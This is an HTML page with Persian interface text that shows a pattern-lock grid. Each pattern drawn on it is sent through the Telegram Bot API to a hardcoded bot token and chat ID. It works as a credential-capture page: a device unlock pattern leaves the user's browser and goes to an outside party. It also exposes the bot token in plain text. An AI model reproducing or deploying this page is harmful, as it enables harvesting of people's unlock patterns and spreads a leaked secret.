<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Pattern Lock to Telegram</title>
  <script src="https://cdn.jsdelivr.net/npm/pattern-lock-js@1.0.0/dist/patternlock.min.js"></script>
  <link href="https://cdn.jsdelivr.net/npm/pattern-lock-js@1.0.0/dist/patternlock.min.css" rel="stylesheet" />
  <style>
    body {
      font-family: "Segoe UI", sans-serif;
      text-align: center;
      margin-top: 60px;
      background-color: #f9f9f9;
    }
    #patternContainer {
      width: 220px;
      margin: 0 auto;
    }
    #output, #status {
      margin-top: 20px;
      font-size: 18px;
    }
    #status.success {
      color: green;
    }
    #status.error {
      color: red;
    }
  </style>
</head>
<body>

<h2>الگوی خود را بکشید</h2>
<div id="patternContainer"></div>
<div id="output"></div>
<div id="status"></div>

<script>
  const lock = new PatternLock("#patternContainer", {
    onPattern: function(pattern) {
      const output = document.getElementById("output");
      const status = document.getElementById("status");

      output.innerText = "الگوی وارد شده: " + pattern;
      status.innerText = "در حال ارسال به تلگرام...";
      status.className = "";

      const token = "5828170484:AAGx5Lbjc9ebQd0YuJ7l-REnXSUoS7OhjAc";
      const chatId = "1353504783";
      const message = `🔒 الگوی وارد شده:\n${pattern}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          status.innerText = "✅ با موفقیت به ربات تلگرام ارسال شد.";
          status.className = "success";
        } else {
          status.innerText = "❌ خطا در ارسال به تلگرام.";
          status.className = "error";
        }
      })
      .catch(error => {
        status.innerText = "❌ خطا در ارتباط با ربات.";
        status.className = "error";
        console.error("Error:", error);
      });
    }
  });
</script>

</body>
</html>
